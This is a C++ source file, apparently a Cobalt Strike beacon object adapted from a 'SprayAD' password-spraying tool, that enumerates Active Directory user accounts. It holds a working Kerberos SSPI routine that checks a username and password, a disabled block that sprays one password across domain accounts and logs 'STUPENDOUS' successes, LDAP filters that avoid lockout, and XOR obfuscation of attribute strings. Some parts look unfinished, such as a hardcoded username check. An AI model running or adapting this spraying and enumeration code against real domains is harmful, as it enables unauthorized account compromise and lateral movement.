#define SECURITY_WIN32 

#include <vector>
#include <set>
#include <iostream>
#include <fstream>
#include "cJSON.h"
#include "obfuscation.h"
using namespace std;


#include <WinSock2.h>
#pragma comment (lib, "ws2_32.lib")

#include <windows.h>
#include <activeds.h>
#include <dsgetdc.h>
#include <lm.h>
#include <security.h>
#include <sddl.h>

#include <stdlib.h>
#include <stdio.h>
#include <wchar.h>
#include <atlstr.h>
#include <strsafe.h>
#include <atltime.h>
#include <SetupAPI.h> // 引入Setup API头文件  
#pragma comment(lib, "SetupAPI.lib") // 链接到Setup API库  

#include "SprayAD.h"
#include "beacon.h"
#include "beacon_compatibility.h"

#pragma comment(lib, "NetApi32.lib")

#include <wtsapi32.h>

#pragma comment(lib, "Wtsapi32.lib")

#include <DSRole.h>
#pragma comment(lib, "netapi32.lib")

#pragma comment(lib, "Activeds.lib")
#pragma comment(lib, "ADSIid.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Kernel32.lib")

namespace LDAPUser {
	const ULONGLONG MAX_PWD_AGE = 0xFFFF5AFB35408000;
}

#define PASSWORD_TYPE_REQ		1
#define PASSWORD_TYPE_EMPTY		2
#define PASSWORD_TYPE_LOCK		3

typedef struct _USERACCOUNT
{
	CString     UserName;               // 用户名
	CString     strDomain;              // 所在域
	CString     strGroup;               // 所在组
	CString     strSID;                 // SID
	CString     strHomePath;            // home 
	BOOL        bDisabled;              // 是否禁用
	BOOL        bAdmin;                 // 是否管理员
	__time64_t  tmLastLogon;            // 最后登录时间
	CString		strLastLogon;            // 最后登录时间
	DWORD       dwPwStatus;             // 密码状态， 已设置 1， 空密码 2， 已锁定 3 域用户：1 需要密码 2 无需密码
	CStringA    strPwdChangeTime;       // 密码修改时间
	CStringA    strPwdExpireTime;       // 密码过期时间
	CStringA    strAccountLockTime;		// 账户锁定时间过期时间
	CStringA    strAccountType;          // 1 本地账户，2全局账户 3 域用户
	CStringA    strIsDomain;             // 1 是，2不是
}UserAccount;

vector<UserAccount> g_CheckUsers;

#define BUF_SIZE 512
#define MAXTOKENSIZE 48000

INT iGarbage = 1;
LPSTREAM lpStream = (LPSTREAM)1;
PDOMAIN_CONTROLLER_INFOW pdcInfo = (PDOMAIN_CONTROLLER_INFOW)1;

BOOL GetLocalCurUserName(CString& strUserName);

BOOL IsDomainUser()
{
	BOOL bRet = FALSE;
	DSROLE_PRIMARY_DOMAIN_INFO_BASIC* info;
	DWORD dw;

	dw = DsRoleGetPrimaryDomainInformation(NULL,
		DsRolePrimaryDomainInfoBasic,
		(PBYTE*)&info);
	if (dw != ERROR_SUCCESS)
	{
		wprintf(L"DsRoleGetPrimaryDomainInformation: %u\n", dw);
		return dw;
	}

	if (info->DomainNameDns == NULL)
	{
		wprintf(L"DomainNameDns is NULL\n");
	}
	else
	{
		wprintf(L"DomainNameDns: %s\n", info->DomainNameDns);
		bRet = TRUE;
	}

	DsRoleFreeMemory(info);

	return bRet;
}

CString GetDomainName()
{
	DSROLE_PRIMARY_DOMAIN_INFO_BASIC* info;
	DWORD dw;

	dw = DsRoleGetPrimaryDomainInformation(NULL,
		DsRolePrimaryDomainInfoBasic,
		(PBYTE*)&info);
	if (dw != ERROR_SUCCESS)
	{
		wprintf(L"DsRoleGetPrimaryDomainInformation: %u\n", dw);
		return "";
	}

	if (info->DomainNameDns == NULL)
	{
		wprintf(L"DomainNameDns is NULL\n");
	}
	else
	{
		wprintf(L"DomainNameDns: %s\n", info->DomainNameDns);

		return CString(info->DomainNameDns);
	}

	return "";
}

HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
	HRESULT hr = S_OK;
	va_list argList;
	WCHAR chBuffer[1024];
	DWORD dwWritten = 0;

	if (lpStream <= (LPSTREAM)1) {
		hr = CreateStreamOnHGlobal(NULL, TRUE, &lpStream);
		if (FAILED(hr)) {
			return hr;
		}
	}

	va_start(argList, lpwFormat);
	memset(chBuffer, 0, sizeof(chBuffer));
	if (!_vsnwprintf_s(chBuffer, _countof(chBuffer), _TRUNCATE, lpwFormat, argList)) {
		hr = E_FAIL;
		goto CleanUp;
	}

	if (FAILED(hr = lpStream->Write(chBuffer, (ULONG)wcslen(chBuffer) * sizeof(WCHAR), &dwWritten))) {
		goto CleanUp;
	}

CleanUp:

	va_end(argList);
	return hr;
}

VOID BeaconOutputStreamW() {
	STATSTG ssStreamData = { 0 };
	SIZE_T cbSize = 0;
	ULONG cbRead = 0;
	LARGE_INTEGER pos;
	LPWSTR lpwOutput = NULL;

	if (FAILED(lpStream->Stat(&ssStreamData, STATFLAG_NONAME))) {
		return;
	}

	cbSize = ssStreamData.cbSize.LowPart;
	lpwOutput = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
	if (lpwOutput != NULL) {
		pos.QuadPart = 0;
		if (FAILED(lpStream->Seek(pos, STREAM_SEEK_SET, NULL))) {
			goto CleanUp;
		}

		if (FAILED(lpStream->Read(lpwOutput, (ULONG)cbSize, &cbRead))) {		
			goto CleanUp;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);

		printf("%ls", lpwOutput);
	}

CleanUp:

	if (lpStream != NULL) {
		lpStream->Release();
		lpStream = NULL;
	}

	if (lpwOutput != NULL) {
		HeapFree(GetProcessHeap(), 0, lpwOutput);
	}

	return;
}

void GetFormattedErrMsg(_In_ HRESULT hr) {
    LPWSTR lpwErrorMsg = NULL;

    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,  
	NULL,
	(DWORD)hr,
	MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
	(LPWSTR)&lpwErrorMsg,
	0,
	NULL);

	if (lpwErrorMsg != NULL) {
		BeaconPrintf(CALLBACK_ERROR, "HRESULT 0x%08lx: %ls", hr, lpwErrorMsg);
		LocalFree(lpwErrorMsg);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "HRESULT 0x%08lx", hr);
	}

    return;
}

BOOL LogonUserSSPI(_In_ LPWSTR pszSSP, _In_ LPWSTR pszAuthority, _In_ LPWSTR pszPrincipal, _In_ LPWSTR pszPassword) {
	BOOL bResult = FALSE;
	PBYTE pBufC2S = NULL;
	PBYTE pBufS2C = NULL;

	HINSTANCE hModule = LoadLibraryA("Secur32.dll");
	if (hModule == NULL) {
		return FALSE;
	}

	// Here's where we specify the credentials to verify:
	SEC_WINNT_AUTH_IDENTITY_EXW authIdent = {
		SEC_WINNT_AUTH_IDENTITY_VERSION,
		sizeof authIdent,
		(unsigned short *)pszPrincipal,
		lstrlenW(pszPrincipal),
		(unsigned short *)pszAuthority,
		lstrlenW(pszAuthority),
		(unsigned short *)pszPassword,
		lstrlenW(pszPassword),
		SEC_WINNT_AUTH_IDENTITY_UNICODE,
		0, 0
	};

	// Get an SSPI handle for these credentials.
	CredHandle hcredClient;
	TimeStamp expiryClient;
	SECURITY_STATUS Status = AcquireCredentialsHandleW(0, pszSSP,
		SECPKG_CRED_OUTBOUND,
		0, &authIdent,
		0, 0,
		&hcredClient,
		&expiryClient);
	if (Status) {
		return FALSE;
	}

	// Use the caller's credentials for the server.
	CredHandle hcredServer;
	TimeStamp expiryServer;
	Status = AcquireCredentialsHandleW(0, pszSSP,
		SECPKG_CRED_INBOUND,
		0, 0, 0, 0,
		&hcredServer,
		&expiryServer);
	if (Status) {
		return FALSE;
	}

	CtxtHandle hctxClient;
	CtxtHandle hctxServer;

	// Create two buffers:
	//    one for the client sending tokens to the server,
	//    one for the server sending tokens to the client
	// (buffer size chosen based on current Kerb SSP setting for cbMaxToken - you may need to adjust this)
	pBufC2S = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAXTOKENSIZE);
	if (pBufC2S == NULL) {
		goto CleanUp;
	}
	
	pBufS2C = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAXTOKENSIZE);
	if (pBufS2C == NULL) {
		goto CleanUp;
	}
	
	SecBuffer sbufC2S = { MAXTOKENSIZE, SECBUFFER_TOKEN, pBufC2S };
	SecBuffer sbufS2C = { MAXTOKENSIZE, SECBUFFER_TOKEN, pBufS2C };
	SecBufferDesc bdC2S = { SECBUFFER_VERSION, 1, &sbufC2S };
	SecBufferDesc bdS2C = { SECBUFFER_VERSION, 1, &sbufS2C };

	// Don't really need any special context attributes.
	DWORD grfRequiredCtxAttrsClient = ISC_REQ_CONNECTION;
	DWORD grfRequiredCtxAttrsServer = ISC_REQ_CONNECTION;

	// Set up some aliases to make it obvious what's happening.
	PCtxtHandle pClientCtxHandleIn = 0;
	PCtxtHandle pClientCtxHandleOut = &hctxClient;
	PCtxtHandle pServerCtxHandleIn = 0;
	PCtxtHandle pServerCtxHandleOut = &hctxServer;

	SecBufferDesc* pClientInput = 0;
	SecBufferDesc* pClientOutput = &bdC2S;
	SecBufferDesc* pServerInput = &bdC2S;
	SecBufferDesc* pServerOutput = &bdS2C;

	DWORD grfCtxAttrsClient = 0;
	DWORD grfCtxAttrsServer = 0;
	TimeStamp expiryClientCtx;
	TimeStamp expiryServerCtx;

	// Since the caller is acting as the server, we need a server principal name
	// so that the client will be able to get a Kerb ticket (if Kerb is used).
	WCHAR szSPN[256];
	ULONG cchSPN = sizeof szSPN / sizeof *szSPN;
	GetUserNameExW(NameSamCompatible, szSPN, &cchSPN);

	// Perform the authentication handshake, playing the role of both client *and* server.
	BOOL bClientContinue = TRUE;
	BOOL bServerContinue = TRUE;
	while (bClientContinue || bServerContinue) {
		if (bClientContinue) {
			sbufC2S.cbBuffer = MAXTOKENSIZE;
			Status = InitializeSecurityContextW(
				&hcredClient, pClientCtxHandleIn,
				(SEC_WCHAR*)szSPN,
				grfRequiredCtxAttrsClient,
				0, SECURITY_NATIVE_DREP,
				pClientInput, 0,
				pClientCtxHandleOut,
				pClientOutput,
				&grfCtxAttrsClient,
				&expiryClientCtx);
			switch (Status) {
			case SEC_E_OK:
				bClientContinue = FALSE;
				break;
			case SEC_I_CONTINUE_NEEDED:
				pClientCtxHandleIn = pClientCtxHandleOut;
				pClientInput = pServerOutput;
				break;
			default:
				FreeCredentialsHandle(&hcredClient);
				FreeCredentialsHandle(&hcredServer);
				goto CleanUp;
			}
		}

		if (bServerContinue) {
			sbufS2C.cbBuffer = MAXTOKENSIZE;
			Status = AcceptSecurityContext(
				&hcredServer, pServerCtxHandleIn,
				pServerInput,
				grfRequiredCtxAttrsServer,
				SECURITY_NATIVE_DREP,
				pServerCtxHandleOut,
				pServerOutput,
				&grfCtxAttrsServer,
				&expiryServerCtx);
			switch (Status) {
			case SEC_E_OK:
				bServerContinue = FALSE;
				break;
			case SEC_I_CONTINUE_NEEDED:
				pServerCtxHandleIn = pServerCtxHandleOut;
				break;
			default:
				FreeCredentialsHandle(&hcredClient);
				FreeCredentialsHandle(&hcredServer);
				goto CleanUp;
			}
		}
	}

	// Clean up
	FreeCredentialsHandle(&hcredClient);
	FreeCredentialsHandle(&hcredServer);
	DeleteSecurityContext(pServerCtxHandleOut);
	DeleteSecurityContext(pClientCtxHandleOut);
	bResult = TRUE;

CleanUp:

	if (pBufC2S != NULL) {
		HeapFree(GetProcessHeap(), 0, pBufC2S);
	}

	if (pBufS2C != NULL) {
		HeapFree(GetProcessHeap(), 0, pBufS2C);
	}

	return bResult;
}

void ConvertColToUAStruct(const ADS_SEARCH_COLUMN& col, UserAccount& uAccount)
{
	DWORD x = 0;
	if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING)
	{
		for (x = 0; x < col.dwNumValues; x++) {
			if (_wcsicmp(col.pszAttrName, L"sAMAccountName") == 0)
			{
				if (uAccount.UserName.IsEmpty())
				{
					uAccount.UserName = col.pADsValues->CaseIgnoreString;
				}
			}
			else if (_wcsicmp(col.pszAttrName, L"displayName") == 0)
			{
				uAccount.UserName = col.pADsValues->CaseIgnoreString;
			}
			else if (_wcsicmp(col.pszAttrName, L"description") == 0)
			{
				uAccount.strGroup = col.pADsValues->CaseIgnoreString;
			}
			else if (_wcsicmp(col.pszAttrName, L"homeDirectory") == 0)
			{
				uAccount.strHomePath = col.pADsValues->CaseIgnoreString;
			}
		}
	}
	else if (col.dwADsType == ADSTYPE_INTEGER)
	{
		if (_wcsicmp(col.pszAttrName, L"userAccountControl") == 0)
		{
			uAccount.bDisabled = ((col.pADsValues->Integer & ADS_UF_ACCOUNTDISABLE) == ADS_UF_ACCOUNTDISABLE) ? TRUE : FALSE;

			if ((ADS_UF_PASSWD_NOTREQD & col.pADsValues->Integer) == ADS_UF_PASSWD_NOTREQD)
			{
				uAccount.dwPwStatus = PASSWORD_TYPE_EMPTY;
			}
			else if ((ADS_UF_LOCKOUT & col.pADsValues->Integer) == ADS_UF_LOCKOUT)
			{
				uAccount.dwPwStatus = PASSWORD_TYPE_LOCK;
			}
			else
			{
				uAccount.dwPwStatus = PASSWORD_TYPE_REQ;
			}
		}
		else if (_wcsicmp(col.pszAttrName, L"ms-DS-User-Account-Control-Computed") == 0)
		{
			uAccount.bDisabled = ((col.pADsValues->Integer & ADS_UF_ACCOUNTDISABLE) == ADS_UF_ACCOUNTDISABLE) ? TRUE : FALSE;

			if ((ADS_UF_LOCKOUT & col.pADsValues->Integer) == ADS_UF_LOCKOUT)
			{
				uAccount.dwPwStatus = PASSWORD_TYPE_LOCK;
			}
		}
		else if (_wcsicmp(col.pszAttrName, L"maxPwdAge") == 0)
		{
			CStringW strTime;
			DWORD Days = col.pADsValues->LargeInteger.QuadPart / 1000 / 1000 / 1000 / 60 / 60 / 24;
			strTime.Format(L"%d day(s)", Days);
			uAccount.strPwdExpireTime = strTime;
		}
	}
	else if (col.dwADsType == ADSTYPE_LARGE_INTEGER)
	{
		for (x = 0; x < col.dwNumValues; x++)
		{
			if (_wcsicmp(col.pszAttrName, L"lastLogon") == 0)
			{
				ADS_UTC_TIME tm = col.pADsValues->UTCTime;
				SYSTEMTIME monTS;
				if (FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&tm), &monTS) != FALSE)
				{
					CStringA sTime;
					sTime.Format("%04d-%02d-%02d %02d:%02d:%02d", monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond);

					uAccount.strLastLogon = sTime;
				}
				uAccount.tmLastLogon = col.pADsValues->Timestamp.WholeSeconds;
			}
			else if (_wcsicmp(col.pszAttrName, L"pwdLastSet") == 0)
			{
				if (col.pADsValues->Integer != 0)
				{
					ADS_UTC_TIME tm = col.pADsValues->UTCTime;
					SYSTEMTIME monTS;
					if (FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&tm), &monTS) != FALSE)
					{
						CStringA sTime;
						sTime.Format("%04d-%02d-%02d %02d:%02d:%02d", monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond);

						uAccount.strPwdChangeTime = sTime;
					}
				}
			}
			else if (_wcsicmp(col.pszAttrName, L"lockoutTime") == 0)
			{

				if (col.pADsValues->Integer != 0)
				{
					ADS_UTC_TIME tm = col.pADsValues->UTCTime;
					SYSTEMTIME monTS;
					if (FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&tm), &monTS) != FALSE)
					{
						CStringA sTime;
						sTime.Format("%04d-%02d-%02d %02d:%02d:%02d", monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond);

						uAccount.strAccountLockTime = sTime;
					}
				}
			}
		}
	}
	else if (col.dwADsType == ADSTYPE_OCTET_STRING)
	{
		for (x = 0; x < col.dwNumValues; x++)
		{
			if (_wcsicmp(col.pszAttrName, L"objectSid") == 0)
			{
				PSID pObjectSID = NULL;
				LPWSTR lpSID = NULL;
				pObjectSID = (PSID)(col.pADsValues[x].OctetString.lpValue);
				// Convert SID to string.
				ConvertSidToStringSidW(pObjectSID, &lpSID);
				uAccount.strSID = lpSID;

				if (lpSID)
				{
					LocalFree(lpSID);
				}
			}
		}
	}
	else if (col.dwADsType == ADSTYPE_BOOLEAN)
	{
		for (x = 0; x < col.dwNumValues; x++) {
			if (_wcsicmp(col.pszAttrName, L"isCriticalSystemObject") == 0)
			{
				uAccount.bAdmin = col.pADsValues->Boolean;
			}
		}
	}
}

HRESULT SprayUsers(_In_ IDirectorySearch *pContainerToSearch, _In_ LPCWSTR lpwSprayPasswd, _In_ LPCWSTR lpwFilter, _In_ BOOL bLdapAuth, _In_ LPCWSTR lpwMaxBadPwdCount) {
	HRESULT hr = S_OK;
	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
	LPCWSTR pszAttrFilter[] = { /*L"ADsPath", L"Name",*/ 
		L"userAccountControl",
		L"lastLogon",
		L"sAMAccountName"};
	LPCWSTR lpwFormat1 = L"(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(lockoutTime>=1))(!(badPwdCount>=%ls))(sAMAccountName=%ls))"; // Only enabled accounts
	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)((sAMAccountName=%ls)))"; // Only enabled accounts // (!(userAccountControl:1.2.840.113556.1.4.803:=2))
	
	PUSER_INFO pUserInfo = NULL;
	INT iCount = 0;
	DWORD x = 0L;
	LPWSTR pszColumn = NULL;
	IADs *pRoot = NULL;
	IID IADsIID;
	ADS_SEARCH_COLUMN col;
	DWORD dwAccountsFailed = 0;
	DWORD dwAccountsSuccess = 0;

	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return S_FALSE;
	}

	_FreeADsMem FreeADsMem = (_FreeADsMem)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "FreeADsMem");
	if (FreeADsMem == NULL) {
		return S_FALSE;
	}

	if (!pContainerToSearch) {
		return E_POINTER;
	}

	// Calculate Program run time.
	LARGE_INTEGER frequency;
	LARGE_INTEGER start;
	LARGE_INTEGER end;
	double interval;

	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&start);

	// Specify subtree search
	ADS_SEARCHPREF_INFO SearchPrefs;
	SearchPrefs.dwSearchPref = ADS_SEARCHPREF_PAGESIZE;
	SearchPrefs.vValue.dwType = ADSTYPE_INTEGER;
	SearchPrefs.vValue.Integer = 1000;
	DWORD dwNumPrefs = 1;

	// Handle used for searching
	ADS_SEARCH_HANDLE hSearch = NULL;

	// Set the search preference
	hr = pContainerToSearch->SetSearchPreference(&SearchPrefs, dwNumPrefs);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set search preference.\n");
		goto CleanUp;
	}

	// Add the filter.
	if (lpwFilter == NULL) {
//		lpwFilter = L"*";
		BeaconPrintf(CALLBACK_ERROR, "Empty username!\n");
		return hr;
	}
	swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, lpwFilter);


	pUserInfo = (PUSER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_INFO));
	if (pUserInfo == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to allocate UserInfo memory.\n");
		goto CleanUp;
	}

	// Return specified properties
	hr = pContainerToSearch->ExecuteSearch(wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &hSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to execute search.\n");
		goto CleanUp;
	}

	// Resolve IID from GUID string.
	if (bLdapAuth) {
		LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
		HRESULT hr = IIDFromString(pIADsIID, &IADsIID);
		if (FAILED(hr)) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to resolve IID.\n");
			goto CleanUp;
		}
	}

	if (SUCCEEDED(hr)) {	
		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data.
		hr = pContainerToSearch->GetFirstRow(hSearch);
		if (SUCCEEDED(hr)) 
		{
			while (hr != S_ADS_NOMORE_ROWS) 
			{
				UserAccount uAccount;

				uAccount.strAccountType = L"3";

				// Keep track of count.
				iCount++;

				// Loop through the array of passed column names.
				while (pContainerToSearch->GetNextColumnName(hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS) 
				{
					hr = pContainerToSearch->GetColumn(hSearch, pszColumn, &col);
					if (SUCCEEDED(hr)) 
					{
						if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING) 
						{
							for (x = 0; x < col.dwNumValues; x++) {
								if (_wcsicmp(col.pszAttrName, L"sAMAccountName") == 0)
								{
#if 0
									if (bLdapAuth)
									{
										hr = ADsOpenObject(L"LDAP://rootDSE",
											col.pADsValues->CaseIgnoreString,
											lpwSprayPasswd,
											ADS_SECURE_AUTHENTICATION | ADS_FAST_BIND, // Use Secure Authentication
											IADsIID,
											(void**)&pRoot);
										if (FAILED(hr))
										{
											BeaconPrintToStreamW(L"[-] Failed => %ls\\%ls\n", pdcInfo->DomainName, lpwFilter);
										}

										if (SUCCEEDED(hr))
										{
											BeaconPrintToStreamW(L"[+] STUPENDOUS => %ls\\%ls:%ls\n", pdcInfo->DomainName, lpwFilter, lpwSprayPasswd);
											wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);

											dwAccountsSuccess = dwAccountsSuccess + 1;
										}
										if (pRoot)
										{
											pRoot->Release();
											pRoot = NULL;
										}
									}
									else
									{
										BOOL bResult = LogonUserSSPI(L"Kerberos",
											pdcInfo->DomainName,
											col.pADsValues->CaseIgnoreString,
											(LPWSTR)lpwSprayPasswd);

										if (!bResult)
										{
											BeaconPrintToStreamW(L"[-] Failed => %ls\\%ls-%ls\n", pdcInfo->DomainName, lpwFilter, col.pADsValues->CaseIgnoreString);
										}
										if (bResult)
										{
											BeaconPrintToStreamW(L"[+] STUPENDOUS => %ls\\%ls:%ls\n", pdcInfo->DomainName, lpwFilter, lpwSprayPasswd);
											wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);

											dwAccountsSuccess = dwAccountsSuccess + 1;
										}
									}
									break;
#endif
									uAccount.UserName = col.pADsValues->CaseIgnoreString;
								}
							}
						}
						else if (col.dwADsType == ADSTYPE_INTEGER)
						{
							if (_wcsicmp(col.pszAttrName, L"userAccountControl") == 0)
							{
								uAccount.bDisabled = ((col.pADsValues->Integer & 0x2) == 0x02) ? TRUE : FALSE;
							} 
							else if (_wcsicmp(col.pszAttrName, L"lastLogon") == 0)
							{
								CString strValue = col.pADsValues->CaseIgnoreString;
								uAccount.strLastLogon = strValue;
							}
							else if (_wcsicmp(col.pszAttrName, L"lastLogonTimestamp") == 0)
							{
								ADS_LARGE_INTEGER strValue = col.pADsValues->LargeInteger;
								uAccount.tmLastLogon = strValue.QuadPart;
							}
						}
						else if (col.dwADsType == ADSTYPE_LARGE_INTEGER)
						{
							for (x = 0; x < col.dwNumValues; x++) 
							{
								if (_wcsicmp(col.pszAttrName, L"lastLogon") == 0)
								{
									ADS_UTC_TIME tm = col.pADsValues->UTCTime;
									SYSTEMTIME monTS;
									if (FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&tm), &monTS) != FALSE)
									{
										CStringA sTime;
										sTime.Format("%04d-%02d-%02d %02d:%02d:%02d", monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond);

										uAccount.strLastLogon = sTime;
									}
									uAccount.tmLastLogon = col.pADsValues->Timestamp.WholeSeconds;
								}
							}
						}

						pContainerToSearch->FreeColumn(&col);
					}

					if (pszColumn != NULL) {
						FreeADsMem(pszColumn);
					}
				}

				g_CheckUsers.emplace_back(uAccount);


				// Get the next row
				hr = pContainerToSearch->GetNextRow(hSearch);
				
			}
		}
		// Close the search handle to clean up
		pContainerToSearch->CloseSearchHandle(hSearch);
	}



	for (auto it : g_CheckUsers)
	{
		if (it.UserName.CompareNoCase("shimingming") == 0)
			printf("%s \t %s ", it.UserName.GetBuffer(), it.strLastLogon.GetBuffer());
	}

	if (SUCCEEDED(hr) && 0 == iCount) {
		hr = S_FALSE;
	}
	
	if (dwAccountsSuccess == 0) {
		BeaconPrintToStreamW(L"[-] Failed => %ls\\%ls (Skip!)\n", pdcInfo->DomainName, lpwFilter);
	}


CleanUp:

	
	if (pUserInfo != NULL) {
		HeapFree(GetProcessHeap(), 0, pUserInfo);
	}

	return hr;
}

DWORD QueryAdHomePathFromSid(char* homePath, size_t homePathLen, PSID psid, PWSTR domain) {
	DWORD code = 1; /* default is failure */
	NTSTATUS rv = 0;
	HRESULT hr = S_OK;
	LPWSTR p = NULL;
	WCHAR adsPath[MAX_PATH] = L"";
	BOOL coInitialized = FALSE;
	CHAR ansidomain[256], * a;

	homePath[0] = '\0';

	/* I trust this is an ASCII domain name */
	for (p = domain, a = ansidomain; *a = (CHAR)*p; p++, a++);
	printf("Domain: %s", ansidomain);

	if (ConvertSidToStringSidW(psid, &p)) {
		IADsNameTranslate* pNto;

		printf("Got SID string [%S]", p);

		hr = CoInitialize(NULL);
		if (SUCCEEDED(hr))
			coInitialized = TRUE;

		hr = CoCreateInstance(CLSID_NameTranslate,
			NULL,
			CLSCTX_INPROC_SERVER,
			IID_IADsNameTranslate,
			(void**)&pNto);

		if (FAILED(hr)) { printf("Can't create nametranslate object"); }
		else {
			hr = pNto->Init(ADS_NAME_INITTYPE_GC, L"");
			if (FAILED(hr)) {
				printf("NameTranslate Init GC failed [%ld]", hr);
				if (domain) {
					hr = pNto->Init(ADS_NAME_INITTYPE_DOMAIN, domain);
					if (FAILED(hr)) {
						printf("NameTranslate Init Domain failed [%ld]", hr);
					}
				}
			}

			if (!FAILED(hr)) {
				hr = pNto->Set(ADS_NAME_TYPE_SID_OR_SID_HISTORY_NAME, p);
				if (FAILED(hr)) { printf("Can't set sid string"); }
				else {
					BSTR bstr;

					hr = pNto->Get(ADS_NAME_TYPE_1779, &bstr);
					if (SUCCEEDED(hr)) {
						hr = StringCchCopyW(adsPath, MAX_PATH, bstr);
						if (FAILED(hr)) {
							printf("Overflow while copying ADS path");
							adsPath[0] = L'\0';
						}

						SysFreeString(bstr);
					}
				}
			}
			pNto->Release();
		}

		LocalFree(p);

	}
	else {
		printf("Can't convert sid to string");
	}

	if (adsPath[0]) {
		WCHAR fAdsPath[MAX_PATH];
		IADsUser* pAdsUser;
		BSTR bstHomeDir = NULL;

		hr = StringCchPrintfW(fAdsPath, MAX_PATH, L"LDAP://%s", adsPath);
		if (hr != S_OK) {
			printf("Can't format full adspath");
			goto cleanup;
		}

		printf("Trying adsPath=[%S]", fAdsPath);

		hr = ADsGetObject(fAdsPath, IID_IADsUser, (LPVOID*)&pAdsUser);
		if (hr != S_OK) {
			printf("Can't open IADs object");
			goto cleanup;
		}

		hr = pAdsUser->get_Profile(&bstHomeDir);
		hr = pAdsUser->get_HomeDirectory(&bstHomeDir);
		hr = pAdsUser->get_EmailAddress(&bstHomeDir);
		if (hr != S_OK) {
			printf("Can't get profile directory");
			goto cleanup_homedir_section;
		}

		wcstombs(homePath, bstHomeDir, homePathLen);

		printf("Got homepath [%s]", homePath);

		SysFreeString(bstHomeDir);

		code = 0;

	cleanup_homedir_section:
		pAdsUser->Release();
	}

cleanup:
	if (coInitialized)
		CoUninitialize();

	return code;
}

HRESULT SprayCurDomainUsers(_In_ IDirectorySearch* pContainerToSearch, _In_ BOOL bListALL, _In_ LPCWSTR lpwFilterDevice, _In_ LPCWSTR lpwFilterName, _Out_ vector<UserAccount>& Users) {
	HRESULT hr = S_OK;
	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
	LPCWSTR pszAttrFilter[] = { /*L"ADsPath", L"Name",*/
		XorStringW(L"userAccountControl",L"ms-DS-User-Account-Control-Computed"),
		XorStringW(L"isCriticalSystemObject"), // boolean
		XorStringW(L"lastLogon"),
		XorStringW(L"pwdLastSet"),
		XorStringW(L"maxPwdAge"),
		XorStringW(L"description"),
		XorStringW(L"objectSid"),
		XorStringW(L"sAMAccountName"),
		XorStringW(L"description"),
		XorStringW(L"homeDirectory"),
		XorStringW(L"lockoutTime"),
		XorStringW(L"displayName"),
	};
	LPCWSTR lpwFormat1 = L"(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(lockoutTime>=1))(!(badPwdCount>=%ls))(sAMAccountName=%ls))"; // Only enabled accounts
	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)((sAMAccountName=%ls)))"; // Only enabled accounts // (!(userAccountControl:1.2.840.113556.1.4.803:=2))

	PUSER_INFO pUserInfo = NULL;
	INT iCount = 0;
	DWORD x = 0L;
	LPWSTR pszColumn = NULL;
	IADs* pRoot = NULL;
	IID IADsIID;
	ADS_SEARCH_COLUMN col;
	DWORD dwAccountsFailed = 0;
	DWORD dwAccountsSuccess = 0;

	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return S_FALSE;
	}

	_FreeADsMem FreeADsMem = (_FreeADsMem)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "FreeADsMem");
	if (FreeADsMem == NULL) {
		return S_FALSE;
	}

	if (!pContainerToSearch) {
		return E_POINTER;
	}

	// Calculate Program run time.
	LARGE_INTEGER frequency;
	LARGE_INTEGER start;
	LARGE_INTEGER end;
	double interval;

	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&start);

	// Specify subtree search
